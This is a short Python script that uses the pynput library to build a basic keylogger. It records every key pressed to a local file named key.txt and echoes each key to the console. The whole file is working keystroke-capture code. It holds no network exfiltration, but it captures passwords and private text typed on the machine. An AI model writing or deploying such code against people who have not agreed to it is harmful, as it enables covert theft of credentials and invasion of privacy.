from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("key.txt", 'a') as logKey:
       try:
           char = key.char
           logKey.write(char)
       except (Exception):
           print("Error For Char")
           logKey.write(' ')

if __name__ == "__main__":
    Listener = keyboard.Listener(on_press=keyPressed)
    Listener.start()
    input()

